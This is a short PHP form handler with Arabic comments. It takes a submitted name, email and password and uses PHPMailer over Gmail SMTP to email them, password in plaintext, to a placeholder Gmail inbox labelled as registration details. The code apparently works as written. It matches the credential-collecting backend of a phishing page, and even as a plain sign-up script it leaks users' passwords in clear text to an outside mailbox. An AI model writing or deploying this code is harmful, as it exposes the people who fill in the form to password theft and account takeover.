<?php
require 'PHPMailer/PHPMailerAutoload.php'; // تضمين مكتبة PHPMailer

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $name = $_POST['name'];
    $password = $_POST['password'];

    // إعداد PHPMailer لإرسال البريد إلى Gmail
    $mail = new PHPMailer;

    // إعداد الخادم SMTP
    $mail->isSMTP();
    $mail->Host = 'smtp.gmail.com'; 
    $mail->SMTPAuth = true;
    $mail->Username = 'your-email@gmail.com'; // بريدك الإلكتروني في Gmail
    $mail->Password = 'your-gmail-app-password'; // كلمة مرور التطبيق من Gmail
    $mail->SMTPSecure = 'tls';
    $mail->Port = 587;

    // من وإلى من
    $mail->setFrom('your-email@gmail.com', 'Website');
    $mail->addAddress('your-email@gmail.com'); // بريدك لاستلام البيانات

    // إعدادات الموضوع والمحتوى
    $mail->Subject = 'New Registration Details';
    $mail->Body    = "New registration details:\n\nName: $name\nEmail: $email\nPassword: $password";

    if (!$mail->send()) {
        echo 'Message could not be sent. Mailer Error: ' . $mail->ErrorInfo;
    } else {
        echo 'Message has been sent';
    }
}
?>
